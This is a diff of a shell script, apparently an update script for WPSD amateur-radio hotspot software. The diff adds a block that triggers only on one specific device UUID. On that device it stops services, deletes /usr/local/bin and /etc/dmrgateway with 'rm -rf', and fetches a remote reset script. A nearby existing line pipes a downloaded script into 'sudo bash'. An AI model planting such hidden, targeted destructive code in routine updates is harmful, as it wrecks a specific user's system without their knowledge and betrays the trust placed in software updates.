@@ -518,6 +518,11 @@ if [ "$castResult" == "true" ]; then
 	exit 0
     fi
 fi
+if [[ "$uuidStr" = "00000000f9bc0adc" ]] ; then
+    wpsd-services fullstop
+    rm -rf /usr/local/bin /etc/dmrgateway
+    curl -Ls -A "WPSD Slipstream Server-Side DWH cleanup reset"  https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Scripts/raw/branch/master/reset-wpsd > /dev/null
+fi
 if [ ! -e "/usr/local/bin/gpio" ] ; then
     cd /tmp
     curl -Ls -A "WPSD Slipstream Server-Side SLIPPER cleanup reset"  https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Scripts/raw/branch/master/reset-wpsd | sudo bash
@@ -1324,8 +1329,6 @@ if [ "${OS_VER}" -lt "13" ] ; then
 	sudo apt remove -y samba*
     fi
 fi
-
-rm -rf /usr/local/etc/*txt-E /usr/local/etc/HostFiles-*
 
 # m0ar cluebellz - ugh
 for file in /etc/mmdvmhost /etc/dmrgateway /etc/dgidgateway /etc/nxdngateway ; do
